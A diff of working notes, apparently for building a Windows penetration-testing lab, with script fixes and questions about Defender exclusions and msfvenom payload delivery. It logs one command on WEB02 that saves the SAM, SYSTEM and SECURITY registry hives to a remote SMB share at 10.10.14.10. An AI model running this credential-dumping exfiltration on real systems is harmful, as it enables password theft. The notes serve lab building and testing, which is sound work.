@@ -1,31 +1,7 @@
-Questions:
-
-
-WEB02: Before getting NT Authority, are we able to check the MP preference to see which directories have an exclusion? Are we able to set an exclusion?
-
-
-DMZ01: Before getting NT Authority, are we able to read Chris' PowerShell history file?
-
-
-Root Folder - pentest-report.txt quarantined by Windows Defender
-
-
-Make sure Windows Security is initialized before running the script
-
-Make sure in the penetration testing report, you change directory to the intended directory, before creating the msfvenom payload. Make sure the python3 http server is started immediately after creating the payload.
-
-
--------------------------------
-Overview:
-When creating the new virtual machine, set the encryption password to password123!!
-In the Virtual Machine Settings, Under "Device status", enable "Connect at power on" (you have to do this for each OS).
-
-
 DC01 script:
 Change: Current checkpoint is: 10 (at the end of the DC01 script.) Instead say "Setup Complete".
 
-MAIL01 script:
-Add the instruction to open server manager.
+
 
 DEV01 script:
 1. Add a checkpoint in this script, so if MyService is already created and the permissions are already set (if Step 7 is complete) it will start with the manual step (Install XAMPP for Windows)
@@ -49,6 +25,30 @@ Change Port 444 to 4452
 
 
 
+
+
+-----------------------------------------------------------------------------------------------------------------------
+Questions:
+
+
+WEB02: Before getting NT Authority, are we able to check the MP preference to see which directories have an exclusion? Are we able to set an exclusion?
+
+
+DMZ01: Before getting NT Authority, are we able to read Chris' PowerShell history file?
+
+
+Root Folder - pentest-report.txt quarantined by Windows Defender
+
+
+Make sure Windows Security is initialized before running the script
+
+Make sure in the penetration testing report, you change directory to the intended directory, before creating the msfvenom payload. Make sure the python3 http server is started immediately after creating the payload.
+
+
+When creating the new virtual machine, set the encryption password to password123!!
+In the Virtual Machine Settings, Under "Device status", enable "Connect at power on" (you have to do this for each OS).
+
+
 WEB02 execution:
 PS C:\Windows\System32> reg.exe save hklm\sam \\10.10.14.10\samba\sam.save; reg.exe save hklm\system \\10.10.14.10\samba\system.save; reg.exe save hklm\security \\10.10.14.10\samba\security.save
 reg.exe save hklm\sam \\10.10.14.10\samba\sam.save; reg.exe save hklm\system \\10.10.14.10\samba\system.save; reg.exe save hklm\security \\10.10.14.10\samba\security.save
@@ -57,3 +57,7 @@ ERROR: A required privilege is not held by the client.
 
 Why is a required privilege not held? Was this a fluke? Or does WEB02 need to be rebooted and re-backed-up?
 
+
+
+MAIL01 script:
+Add the instruction to open server manager.
